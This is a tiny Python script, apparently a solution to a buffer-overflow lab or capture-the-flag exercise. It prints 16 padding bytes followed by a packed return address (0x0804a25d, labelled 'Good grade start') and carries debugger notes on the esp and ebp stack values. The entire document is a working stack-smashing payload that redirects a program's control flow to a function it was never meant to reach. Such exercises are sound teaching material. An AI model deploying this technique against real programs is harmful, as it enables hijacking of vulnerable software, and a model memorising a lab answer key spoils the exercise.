import sys
from struct import pack
# Good grade start: 0x0804a25d
# 5: esp: 0xfff6c16c  0xfff6c16c
#   ebp: 0xfff6c178  0xfff6c178
# 6: 0xfff6c178:     0xffffd0d8      0x0804a1f0
sys.stdout.buffer.write(b"a"*16 + pack("<I", 0x0804a25d))